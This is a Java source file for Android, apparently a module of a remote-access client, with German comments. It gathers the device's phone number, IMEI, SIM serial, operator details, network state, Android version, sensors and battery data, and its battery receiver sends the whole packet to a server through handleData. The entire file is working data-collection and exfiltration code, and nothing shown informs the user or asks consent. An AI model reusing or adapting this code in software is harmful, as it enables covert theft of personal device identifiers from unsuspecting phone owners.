package my.app.Library;

import java.util.ArrayList;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.telephony.TelephonyManager;
import my.app.client.ClientListener;
import Packet.AdvancedInformationPacket;

/**
 * Diese Klasse ist dazu da Systeminformationen über das Gerät zusammeln.
 * Dazugehören Informationen über das Gerät, Informationen über das Netzwerk in welchem sich das Gerät befindent,
 * Informationen über das Android welches auf dem gerät installiert ist und schließlich noch Informationen über die im Gerät verbauten Sensoren.
 */
public class AdvancedSystemInfo {
	/**
	 * Die Klasse hat verschiedene Varibalen:
	 * waitinBattery wird nie benutzt
	 * ctx Ein ClientListener, Hier wird jeweils der Client übergeben
	 * channel wird für die Methode handleData benötigt
	 * p Ist die Struktur in welcher alle Informationen über das Gerät gespeichert werden.
	 */
	boolean waitingBattery = true;
	ClientListener ctx;
	int channel;
	AdvancedInformationPacket p;
	/**
	 * Der Konstruktor weißt die entspechenden Daten den Klassenvaribalen zu. Außerdem erstellt er ein neues AdvancedInformationPacket Onjekt.
	 * @param c Der Client welcher die Klasse aufruft und das Objekt erstellt
	 * @param channel Der Kanal für handleData
	 */
	public AdvancedSystemInfo(ClientListener c, int channel) {
		p = new AdvancedInformationPacket();
		ctx = c;
		this.channel = channel;
	}

	/**
	 * Die wichtigste Methode der Klasse. Hier werden alle anderen Methoden aufgerufen.
	 */
	public void getInfos() {
	
		phoneInfo();
		networkInfo();
		androidInfo();
		sensorsInfo();
		/**
		 * Diese Zeile sorgt dafür, dass ein Intent mit den Batterie Informationen gesendet wird und dieser von dem
		 * Broadcast Receiver weiter unten in der Klasse empfangen werden kann.
		 */
		ctx.registerReceiver(this.batteryInfoReceiver,	new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		/*while(waitingBattery) {
			try {
				Thread.sleep(10);
			} catch(Exception e) {}
		}*/
		
		//ctx.handleData(channel, p.build());
	}

	/**
	 * Die Methode holt verschiedene Informationen der Telefons und speicher diese in der Varibalen p.
	 * Bei den Informationen handelt es sich um die Telefonnummer des Handy, Die IMEI, die Software Version,
	 * die Länderkennung, den Anbieter Code, den Namen des Anbieters, den Simkatenanbierter Code, den Simkatenanbieternamen,
	 * den Ländercode der Simkarte und die Serinenummerder Simkarte.
	 * Die methode getSystemService(Context.TELEPHONY_SERVICE) liefert einen Telephonmanger, der die Telefonfeatures des Geräts verwaltet.
	 * Aus diesem TelephonyManager können dann die unterschiedlichen Informationen ausgelesen werden.
	 */
	public void phoneInfo() {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        p.setPhoneNumber(tm.getLine1Number());
        p.setIMEI(tm.getDeviceId());
        p.setSoftwareVersion(tm.getDeviceSoftwareVersion());
        p.setCountryCode(tm.getNetworkCountryIso());
        p.setOperatorCode(tm.getNetworkOperator());
        p.setOperatorName(tm.getNetworkOperatorName());
        p.setSimOperatorCode(tm.getSimOperator());
        p.setSimOperatorName(tm.getSimOperatorName());
        p.setSimCountryCode(tm.getSimCountryIso());
        p.setSimSerial(tm.getSimSerialNumber());
	}
	/**
	 * Mit dieser Funktion werden verschiedene Informationen über die Netzwerke des Gerätes abgefragt und erfasst.
	 */
	public void networkInfo() {
		/**
		 * Um Informationen über die Netzwerke zu erhalten benögitg man einen ConnectivityManager.
		 * Um dann genau Informationen über ein bestimmtes Netzwerk zubekommen muss man nun auf die Vaiablen des Connectivity Managers zugreifen.
		 */
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
		/**
		 * Informationen über das WLan werden in der Vaiablen TYPE_WIFI gespeichert.
		 * Um an diese zu gelangen werden die Daten in der Vaiablen network gespeichert.
		 */
        NetworkInfo network = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		/**
		 * Nun ist es möglich p die verschiedenen Daten hinzuzufügen.
		 * Zu diesen Daten gehören ob das netzwerk vorhanden ist, ob eine Verbindung besteht und zusätzliche Informationen wie z.B. die SSID.
		 */
        p.setWifiAvailable(network.isAvailable());
        p.setWifiConnectedOrConnecting(network.isConnectedOrConnecting());
        p.setWifiExtraInfos(network.getExtraInfo());
        p.setWifiReason(network.getReason());
		/**
		 * Hier wird die Variable TYPE_MOBILE abgefragt um Informationen über das Mobile Netz zuerhalten
		 */
        network = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		/**
		 *Die Informationen werden dann wieder p hinzugefügt. Beim mobilen Netz handelt es sich um die Geschwindigkeit die zu Verfügung steht, ob das Netz vorhanden ist,
		 * ob das Gerät zu dem Netzwerk verbunden ist und weiter Informationen.
		 */
        if(network != null && (network.getSubtype() == TelephonyManager.NETWORK_TYPE_GPRS || network.getSubtype() == TelephonyManager.NETWORK_TYPE_EDGE)) {
        	p.setMobileNetworkName("2g");
        }
        else
        	p.setMobileNetworkName("3g");
        
        p.setMobileNetworkAvailable(network.isAvailable());
        p.setMobileNetworkConnectedOrConnecting(network.isConnectedOrConnecting());
        p.setMobileNetworkExtraInfos(network.getExtraInfo());
        p.setMobileNetworkReason(network.getReason());
	}

	/**
	 * Mit Hilfe dieser Methode lassen sich Informationen über die AndroidVersion die sich auf dem Gerät befindet auslesen.
	 * Auch diese werden dann in der Variablen p gespeichert.
	 * Bei den Informationen handelt es sich um die Versionsnummer und das vonhandene SDK-Level.
	 */
	public void androidInfo() {
		p.setAndroidVersion(android.os.Build.VERSION.RELEASE);
		p.setAndroidSdk(android.os.Build.VERSION.SDK_INT);
	}

	/**
	 * Diese Funktion besorgt Informationen über die verschiedenen Sensoren die in dem Gerät verbaut sind.
	 */
	public void sensorsInfo() {
		/**
		 * Mit Hilfe eine SensoManager ist es Möglich eine Liste aller Sensoren des Gerätes zu erhalten.
		 * Diese wird dann in der Liste msensorList gespeichert
		 */
    	SensorManager mSensorManager= (SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);

        // List of Sensors Available
        List<Sensor> msensorList = mSensorManager.getSensorList(Sensor.TYPE_ALL);
		/**
		 * Die for-Schleife erstellt eine ArrayListe aus Strings und füt dieser die Namen der Sensoren hinzu
		 */
        ArrayList<String> sensors = new ArrayList<String> ();
        for(Sensor s: msensorList) {
        	sensors.add(s.getName());
        }
		/**
		 * Diese Liste wird dann der Vaiablen p hinzugefügt.
		 */
        p.setSensors(sensors);
	}

	/**
	 * Um die Informationen über die Batterie zu erhalten muss ein BroadcastReceiver erstellt werden. Dieser ist hier der batteryInfoReceiver.
	 */
    private BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() {
		@Override
		/**
		 * Diese Funtkion wird aufgerufen wenn ein Intent empfangen wird.
		 * @param context Kontext
		 * @param intent Der empfangen Intent
		 */
		public void onReceive(Context context, Intent intent) {//http://developer.android.com/reference/android/os/BatteryManager.html
			/**
			 * Um nun an die Informationen der Batterie zu gelangen muss nun der im Intent gespeicherte BatteryManager nach den Infromationen durchgegangen werden.
			 * Hierzu werden die Informationen der verschiedenen Variablen des BatteryManager ausgelesen und in Vaiablen zwischen gespeichert.
			 */
			int  health= intent.getIntExtra(BatteryManager.EXTRA_HEALTH,0);
			int  level= intent.getIntExtra(BatteryManager.EXTRA_LEVEL,0);
			int  plugged= intent.getIntExtra(BatteryManager.EXTRA_PLUGGED,0);
			boolean  present= intent.getExtras().getBoolean(BatteryManager.EXTRA_PRESENT);
			int  scale= intent.getIntExtra(BatteryManager.EXTRA_SCALE,0);
			int  status= intent.getIntExtra(BatteryManager.EXTRA_STATUS,0);
			String  technology= intent.getExtras().getString(BatteryManager.EXTRA_TECHNOLOGY);
			int  temperature= intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE,0);
			int  voltage= intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE,0);
			/**
			 * Danach werden diese Varibalen dem Packet p hinzugefügt.
			 * Bei den Inforamtionen der Batterie handelt es sich um deren Zustand, das Ladelevel, ob das Gerät am Kabel ist,
			 * ob die Batterie vorhanden ist, die Größe der Batterie, den Status der Batterie, die Technologie der Batterie,
			 * die Temperatur der Batterie und wieviel Volt die Batterie hat.
			 */
			p.setBatteryHealth(health);
			p.setBatteryLevel(level);
			p.setBatteryPlugged(plugged);
			p.setBatteryPresent(present);
			p.setBatteryScale(scale);
			p.setBatteryStatus(status);
			p.setBatteryTechnology(technology);
			p.setBatteryTemperature(temperature);
			p.setBatteryVoltage(voltage);
			/**
			 * Danach wird hier mit Hilfe des Aufrufs der Methode handleData das Packet an den Server gesendet
			 */
			//waitingBattery = false;
			ctx.handleData(channel, p.build());
			
			ctx.unregisterReceiver(batteryInfoReceiver);
		}
	};
}
